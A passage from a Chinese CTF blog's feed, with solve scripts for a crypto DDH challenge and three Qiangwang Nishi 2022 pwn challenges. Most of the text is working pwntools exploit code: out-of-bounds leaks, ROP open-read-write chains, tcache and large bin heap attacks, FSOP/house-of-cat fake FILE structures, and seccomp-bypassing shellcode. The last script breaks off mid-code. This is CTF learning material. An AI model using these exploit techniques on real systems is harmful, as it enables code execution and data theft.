class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;DDH_instances.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    test = f.read()</span><br><span class="line">test = eval(test)</span><br><span class="line">magic = <span class="number">11</span> * <span class="number">10177</span> *<span class="number">859267</span> * <span class="number">52437899</span>* <span class="number">52435875175126190479447740508185965837690552500527637822603658699938581184513</span>*<span class="number">3</span></span><br><span class="line">choice_order = <span class="number">10177</span></span><br><span class="line">magic = magic//choice_order</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时群的阶为order</span></span><br><span class="line">p = <span class="number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span></span><br><span class="line">K = GF(p)</span><br><span class="line">a = K(<span class="number">0x00</span>)</span><br><span class="line">b = K(<span class="number">0x04</span>)</span><br><span class="line">E = EllipticCurve(K, (a, b))</span><br><span class="line">E.set_order(<span class="number">0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001</span> * <span class="number">0x396C8C005555E1568C00AAAB0000AAAB</span>)</span><br><span class="line">G = E(<span class="number">3745324820672390389968901155878445437664963280229755729082200523555105705468830220374025474630687037635107257976475</span>, <span class="number">2578846078515277795052385204310204126349387494123866919108681393764788346607753607675088305233984015170544920715533</span>)</span><br><span class="line">n = G.order()</span><br><span class="line"></span><br><span class="line">new_G = G*magic</span><br><span class="line"></span><br><span class="line">new_order = new_G.order()</span><br><span class="line">print(<span class="string">f&quot;choice_order = <span class="subst">&#123;new_order&#125;</span>&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bru_dlp</span>(<span class="params">P</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(new_order):</span><br><span class="line">        <span class="keyword">if</span>(i*new_G==P):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">msg = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(test)):</span><br><span class="line">    print(i)</span><br><span class="line">    tmp = test[i]</span><br><span class="line">    aG = magic*E(tmp[<span class="number">0</span>])</span><br><span class="line">    bG = magic*E(tmp[<span class="number">1</span>])</span><br><span class="line">    cG = magic*E(tmp[<span class="number">2</span>])</span><br><span class="line">    a = bru_dlp(aG)</span><br><span class="line">    b = bru_dlp(bG)</span><br><span class="line">    c = bru_dlp(cG)</span><br><span class="line">    <span class="keyword">if</span>((a*b)%new_order==c):</span><br><span class="line">        msg.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg.append(<span class="number">0</span>)</span><br><span class="line">    print(msg)</span><br><span class="line">print(msg)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打的一场CTF，题目比较友好。有空了把剩下没做出来的pwn题复现一下，或者学一下reverse(又预见了🕊)&lt;/p&gt;
&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 </summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
    <category term="ctf" scheme="http://phot0n.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>强网拟态2022</title>
    <link href="http://phot0n.com/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/"/>
    <id>http://phot0n.com/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/</id>
    <published>2022-11-19T14:32:17.000Z</published>
    <updated>2022-11-20T07:20:39.992Z</updated>
    
    <content type="html"><![CDATA[<p>学不动了，把之前做的记录一下</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>比赛过程中做出俩<code>pwn</code>，还有个复现了一下感觉好像也不是很难。剩下的找不到附件了就算了。感觉自己还是啥也不会（</p><h2 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h2><p>一个bf解释器，存在数组越界任意地址读和写，直接泄露栈上的<code>libc</code>地址和<code>rbp</code>内容，然后写<code>orw</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;info&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;172.51.227.109&quot;,9999)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line">payload = <span class="string">b&quot;&gt;&quot;</span>*<span class="number">0x210</span>+<span class="string">b&quot;.&gt;&quot;</span>*<span class="number">6</span>+<span class="string">b&quot;&gt;&quot;</span>*<span class="number">0x22</span>+<span class="string">b&#x27;.&gt;&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;&lt;&#x27;</span>*(<span class="number">0x22</span>+<span class="number">6</span>+<span class="number">6</span><span class="number">-8</span>)+<span class="string">b&#x27;,&gt;&#x27;</span>*(<span class="number">256</span>+<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;BF_PARSER&gt;&gt;&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">debug()</span><br><span class="line">io.recvline()</span><br><span class="line">stack_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">f&#x27;stack_addr = <span class="subst">&#123;hex(stack_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.interactive()</span></span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]<span class="number">-243</span></span><br><span class="line">print(<span class="string">f&#x27;libc_base = <span class="subst">&#123;hex(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000119211</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall = libc_base + <span class="number">0xe2ceb</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rax_ret)+p64(<span class="number">3</span>)+p64(pop_rdi_ret)+p64(<span class="number">0</span>)+p64(syscall) <span class="comment">#关闭文件描述符0</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(stack_addr+<span class="number">232</span>) <span class="comment">#flag字符串</span></span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall) <span class="comment">#open</span></span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(stack_addr+<span class="number">232</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(stack_addr+<span class="number">232</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">print(len(orw))</span><br><span class="line">io.sendline(orw)</span><br><span class="line"><span class="comment">#gadget = libc_base+0x4f302</span></span><br><span class="line"><span class="comment">#io.sendline(p64(gadget))</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h2><p>申请不同大小的，然后根据<code>tcache</code>取的特点取回存在函数指针的堆块进行修改即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,str(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content :&quot;</span>,content)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Success !&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,str(index))</span><br><span class="line">    <span class="comment">#return io.recvline()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,str(index))</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn2-1&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;172.51.227.150&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2 防止放入top chunk</span></span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;let us give you some tips\n&quot;</span>)</span><br><span class="line">add_addr = eval(io.recvline().strip())</span><br><span class="line">print(<span class="string">f&#x27;add_note_adr = <span class="subst">&#123;hex(add_addr)&#125;</span>&#x27;</span>)</span><br><span class="line">magic_addr = add_addr<span class="number">-0x11f0</span>+<span class="number">0x1b70</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">create(<span class="number">16</span>,p64(magic_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>事后复现的，最后沙盒没咋见过卡了点时间</p><p>有<code>UAF</code>,打large bin attack改<code>_IO_list_all</code>然后FSOP进入<code>house of cat</code>调用链，栈迁移写<code>shellcode</code>进行<code>orw</code></p><p>这里有个沙盒问题。它对32位和64位是不同检查的。还有需要注意的是<code>seccomp-tools</code>这玩意默认用的64位进行标识，举个例子也就是说32位架构下的<code>A==lgetxattr</code>其实是<code>A==sys_mmap_pgoff</code> (这俩分别是32位的0xc0号和64位的0xc0号，但是<code>seccomp-tools</code>就算检查32位架构的系统调用号也显示的64位相应的名字)</p><p>草，当时看一大堆没见过的调用号卡了好久（</p><p>还有就是64位下有read和write但是没有open，所以需要用到32位下进行open(也就是这个fstat)。但是由于32位下的地址空间长度和64位下的不一样，你不能直接在堆上进行<code>orw</code>，所以需要mmap(也就是32位下显示的这个<code>sys_mmap_pgoff</code>)一块较低的地址空间，在这上面<code>orw</code>。这里不需要<code>retq</code>，64位下直接向下兼容调用<code>int 0x80</code>即可。</p><p>在堆上写<code>shellcode</code>前先改变一下堆内存的权限为<code>rwx</code>,这里用到了<code>mprotect</code>函数，具体参数为地址(rdi)、长度(rsi)、权限(rdx),权限的话就1|2|4=7就行了。</p><p><code>sys_mmap_pgoff</code>的时候参数大致是<code>mmap(target_addr,len,7,34,0,0)</code>就行了,<code>len</code>和<code>target</code>页对齐一下。然后相应要填的寄存器号分别是<code>rbx,rcx,rdx,rsi,rdi,rbp</code>（不过由于是32为下应该是ebx之类的，不过无所谓了)</p><p><img src="https://s2.loli.net/2022/11/20/gQSjMYoyqiwTEvZ.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./store&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&quot;DEBUG&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd = <span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">size,content,remark</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Remark: &quot;</span>,remark)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;success!\n&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">throw</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content,remark</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Remark: &quot;</span>,remark)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;success!\n&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x520</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">buy(<span class="number">0x500</span>,<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line">throw(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-0x1ebbe0</span></span><br><span class="line">print(<span class="string">f&#x27;libc_base = <span class="subst">&#123;hex(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">io_list = libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">print(<span class="string">f&#x27;io_list = <span class="subst">&#123;hex(io_list)&#125;</span>&#x27;</span>)</span><br><span class="line">paylaod = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(io_list<span class="number">-0x20</span>)</span><br><span class="line">malloc(<span class="number">0x530</span>)</span><br><span class="line">edit(<span class="number">0</span>,paylaod,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">throw(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0x540</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-0xcf0</span></span><br><span class="line">print(<span class="string">f&#x27;heap_base = <span class="subst">&#123;hex(heap_base)&#125;</span>&#x27;</span>)</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">wfilejump = libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">fake_io_addr = heap_base+<span class="number">0xcf0</span></span><br><span class="line">fake_IO_FILE =p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x520</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake_IO_FILE +=p64(0x114514)</span></span><br><span class="line">fake_IO_FILE += p64(wfilejump+<span class="number">0x30</span>)  <span class="comment"># FSOP时vtable=IO_wfile_jumps+0x20</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">mprotect = libc_base+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000 </span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 7</span></span><br><span class="line"><span class="string">    mov rsi, 34</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>) </span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12_ret = libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xa0</span></span><br><span class="line">payload += p64(fake_io_addr+<span class="number">0x520</span>+<span class="number">0xb0</span>)<span class="comment"># rsp</span></span><br><span class="line"><span class="comment">#payload += p64(fake_io_addr+0x520+0xb0) 